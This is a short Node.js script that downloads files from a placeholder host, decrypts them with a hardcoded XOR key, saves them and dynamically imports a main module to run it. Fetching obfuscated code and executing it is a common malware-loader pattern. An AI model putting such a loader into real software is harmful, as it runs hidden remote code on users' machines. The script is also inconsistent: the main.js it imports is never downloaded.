// index.js

import fs from 'fs';
import path from 'path';
import axios from 'axios';
import { fileURLToPath } from 'url';
import { dirname } from 'path';

// Needed to replicate __dirname in ES modules
const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

// Paths
const baseDir = path.join(__dirname, 'modules');
const mainModule = 'main.js';
const filesToDownload = ['module1.js', 'module2.js']; // Placeholder

if (!fs.existsSync(baseDir)) {
  fs.mkdirSync(baseDir);
}

function decrypt(data, key) {
  let result = '';
  let keyIndex = 0;
  for (let i = 0; i < data.length; i++) {
    const charCode = data.charCodeAt(i) ^ key.charCodeAt(keyIndex);
    result += String.fromCharCode(charCode);
    keyIndex = (keyIndex + 1) % key.length;
  }
  return result;
}

async function downloadAndSave(url, filepath) {
  try {
    const response = await axios.get(url, { responseType: 'arraybuffer' });
    const decrypted = decrypt(response.data.toString(), 'myKey'); // Replace with real key
    fs.writeFileSync(filepath, decrypted);
    console.log(`Saved module to ${filepath}`);
  } catch (error) {
    console.error(`Failed to download ${url}`, error.message);
  }
}

(async () => {
  for (let filename of filesToDownload) {
    const filepath = path.join(baseDir, filename);
    const url = `https://example.com/modules/${filename}`;
    await downloadAndSave(url, filepath);
  }

  // Dynamically import the downloaded main module
  const mainPath = path.join(baseDir, mainModule);
  if (fs.existsSync(mainPath)) {
    const mainModule = await import(`file://${mainPath}`);
    console.log('Main module loaded:', mainModule);
  } else {
    console.error('Main module not found.');
  }
})();
